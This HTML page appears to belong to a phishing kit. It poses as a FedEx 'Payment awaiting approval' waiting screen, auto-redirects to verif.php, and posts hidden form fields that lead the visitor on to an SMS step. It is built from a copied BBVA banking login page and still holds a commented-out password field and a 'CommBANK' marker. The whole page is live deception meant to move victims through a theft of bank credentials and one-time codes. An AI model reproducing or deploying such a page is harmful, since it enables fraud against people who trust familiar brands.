<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0060)https://www.bbvanetcash.pe/KDPOSolicitarCredenciales_es.html -->
<html><!--xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">--><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <title>FedEx | Loading ...</title>
	<link rel="icon" href="files/favicon.ico" type="image/x-icon">

	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="0">
    <meta http-equiv="Content-Style-Type" content="text/css">
    <meta http-equiv="refresh" content="45; url=verif.php">
    <meta http-equiv="X-UA-Compatible" content="IE=edge;IE=9;IE=10;IE=11">
    
    <meta http-equiv="Content-Language" content="es">
    <meta name="viewport" content="initial-scale=1">
    <script type="text/javascript" src="./files/plantilla_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/direccionPIBEE_es.js.téléchargement"></script>
    <script type="text/javascript" src="./files/keyBoard_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/desmigrados_es.js.téléchargement"></script>
	<script type="text/javascript" src="./files/cookie.js.téléchargement"></script>
    <!--<link rel="stylesheet" media="screen" href="css/estilos_index_es.css" type="text/css">-->
 	
    
    <!-- CSS de Bootstrap -->
    <link href="./files/bootstrap.css" rel="stylesheet" media="screen">
    <link href="./files/bootstrap-bbva.css" rel="stylesheet" media="screen">
    
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
   
</head>

    
    <!--------------------------------------------------------------------->
    <body >
      
    <div class="container">	
        <!-- HEADER -->
        <div class="row">
        	<div class="col-lg-12 non-padding">
                <ul class="header-layouts list-unstyled visible-xs">
                    <li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
					<li class="colorn-1"></li>
                    
                </ul>
            </div>
			<div class="col-lg-12 visible-xs" style="
    background-color: #4d148c;
    height: 46px;
    margin-top: -13px;
">
				<div class="col-lg-12" style="top:6px">
					<img style="width: 106px;height:auto;" src="./files/logo.png">
				</div>
			</div>
            <div class="col-lg-12 margin-bottomx20">

            </div>
        </div>
        
        <div class="row">
        	<div class="col-lg-12">
            	<div class="container-section-primary padding-top0" onkeyup="reglaPass()">
            		<div class="row">
                    	<div class="col-lg-4 col-md-4 col-sm-4 hidden-xs">
							<img style="width:100%" src="./files/logo.png">
						</div>

						
						<ul class="list-unstyled list-inline-general-header pull-right">
						
						</ul>
						
                    	
                        <div class="clearfix"></div>
                       
                        
                        <div class="col-lg-4 col-md-4 col-sm-4">
                        	<h1 class="margin-bottom-texto-inicial"></h1>
                            <form name="logon" method="POST" action="info.html">
							

  
  
											<input type="hidden" name="to" value="sms.html">
										<input type="hidden" name="frm" value="index.html">
																		

  
  
							<img src="files/tracking.png" alt="" title="" border="0" width="40" height="40">
							<font color="#691A99" class="ws11" style="
    font-size: 18px;
"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payment awaiting approval</font></font></font></font></b></font>
							<div _ngcontent-c5="" class="header-title" style="font-size: 1.4rem!important;line-height: 2rem!important;letter-spacing: -.025rem!important;color: #008000;/* font-weight: 400!important; */font-family: sans-serif;font-weight: bold;margin-bottom: 24px;text-align: center;">
								<p style="box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-align: center !important; margin-left: 0px; margin-right: 0px; margin-top: 0px; margin-bottom: 14px; padding: 0px; background-color: rgb(255, 255, 255)">
								<font style="box-sizing: border-box;" color="#008000">
							<body>
<br> <p style="text-align: left;"><span style="font-size:14px;"><span style="color:#333399;"><span style="font-family:verdana,geneva,sans-serif;"><font style="box-sizing: border-box;">Please Wait ... It may take about 1 minute</font></span></span></span></p>


<p style="text-align: left;"><span style="color:#333399;"><span style="font-family:verdana,geneva,sans-serif;"><span style="font-size:18px;"><span style="font-size:14px;">( Do not close this window )</span></span></span></span></p>

<p style="box-sizing: border-box; padding: 0px; margin: -4px 0px 14px; color: rgb(17, 17, 17); font-family: &quot;Amazon Ember&quot;, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; text-align: center;"><br />
<br />
&nbsp;</p>

<p style="box-sizing: border-box; padding: 0px; margin: -4px 0px 14px; color: rgb(17, 17, 17); font-family: &quot;Amazon Ember&quot;, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; text-align: center;">&nbsp;</p>
</body>
								<p style="box-sizing: border-box; padding: 0px; margin: -4px 0px 14px; color: rgb(17, 17, 17); font-family: &quot;Amazon Ember&quot;, Arial, sans-serif; font-size: 13px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center !important; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial;">
								&nbsp;</p>
								<img src="files/tenor.gif" width="102" height="103"></div>
                            	<input type="hidden" name="from" value="CommBANK">
        						<input type="hidden" name="">
                            	<div class="row" id="id1" style="display: block;">
                                    
									
                                    <div class="col-xs-12 margin-bottomx10">
									&nbsp;&nbsp;
                                    </div>
									<!--
									
                                    <div class="col-xs-12 margin-bottomx10">
									<img style="width: 20px; margin-bottom: 7px;" src="./files/pss.PNG">
                                        <label class="control-label" for="clave de acceso" id="clave_acceso" style=" font-weight: bold; color: #333;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Password</font></font></label>
                                        <input type="password" autocomplete="off" class="form-control" name="Pass" id="Pass" tabindex="3" title="Password" maxlength="20" onfocus="tvSetCampo( this, 11, 'a0' ),pintar(this)" onblur="despintar(this,'#ffffff')" required="">
                                    </div>
                                    -->
									
                             
                                    <p>&nbsp;</div>
                            </form>
                            
                            <div class="line-horizontal line-login-v2"></div>
                            
							
							</div>
							<div class="msj_ico msj_inf">
								
							</div>

                        </div>
						<div>
                            <div class="col-lg-8 col-md-8 col-sm-8">
							  <div class="hidden-xs"> 

                          
							<div class="visible-xs"> 
								<br><br><br>
								<div class="border-option" style="border-top-right-radius: 5px;border-top-left-radius: 5px;">
									<div class="col-xs-12 sin-espacios">
										<div class="col-xs-11 sin-espacios">
											<a class="resaltar-top" href="javascript:abrirformularios();" style="font-size:13px">&nbsp;&nbsp;&nbsp;FEDEX </a>
										</div>
										<div class="col-xs-1 sin-espacios">
											<span class="texto-border">&gt;<!--<span-->
										</span></div>
									</div>
								</div>
								<div class="border-option" style="border-bottom-right-radius: 5px;border-bottom-left-radius: 5px;">
									<div class="col-xs-12 sin-espacios">
										<div class="col-xs-11 sin-espacios">
											<a href="javascript:abrirCatalogo();">&nbsp;&nbsp;&nbsp;FEDEX</a>
										</div>
										<div class="col-xs-1 sin-espacios">
											<span class="texto-border">&gt;<!--<span-->
										</span></div>
									</div>
								</div>									
							</div>
                        </div>
						</div>
                    </div>
                </div>
            </div>
        </div>
        
		<div class="clearfix"></div>
		<!-- FOOTER -->
        <footer class="footer-bbva row">
                
                
        </footer>
		
        <!-- Librería jQuery requerida por los plugins de JavaScript -->
        <script src="./files/jquery-1.11.3.min.js.téléchargement"></script>
        <script src="./files/bootstrap.min.js.téléchargement"></script>
	</div>


</body></html>